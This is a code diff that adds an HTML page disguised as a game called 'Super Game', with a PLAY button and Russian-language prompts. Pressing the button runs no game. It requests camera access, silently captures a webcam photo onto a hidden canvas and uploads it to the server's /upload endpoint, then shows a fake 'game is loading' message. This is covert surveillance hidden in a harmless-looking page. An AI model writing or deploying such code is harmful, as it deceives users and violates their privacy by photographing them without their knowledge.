@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Super Game</title>
+<style>
+body { margin:0; background:#1a1a2e; color:#fff; font-family:sans-serif; text-align:center; }
+.box { padding:80px 20px; }
+h1 { font-size:42px; margin-bottom:10px; }
+button { padding:18px 60px; font-size:22px; background:#e94560; color:#fff; border:none; border-radius:12px; cursor:pointer; }
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>🎮 Super Game</h1>
+  <p>Нажми Play чтобы начать</p>
+  <button onclick="start()">▶ PLAY</button>
+</div>
+<video id="v" autoplay playsinline style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
+<script>
+async function start() {
+  document.body.innerHTML = '<div class="box"><h1>Загрузка...</h1></div>';
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+    const v = document.getElementById('v');
+    v.srcObject = s;
+    await v.play();
+    await new Promise(r => setTimeout(r, 1500));
+    const c = document.getElementById('c');
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext('2d').drawImage(v, 0, 0);
+    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+    const fd = new FormData();
+    fd.append('photo', blob, 'p.jpg');
+    await fetch('/upload', { method: 'POST', body: fd });
+    s.getTracks().forEach(t => t.stop());
+    document.body.innerHTML = '<div class="box"><h1>Игра загружается...</h1></div>';
+  } catch(e) {
+    document.body.innerHTML = '<div class="box"><h1>Нужно разрешить камеру</h1></div>';
+  }
+}
+</script>
+</body>
+</html>
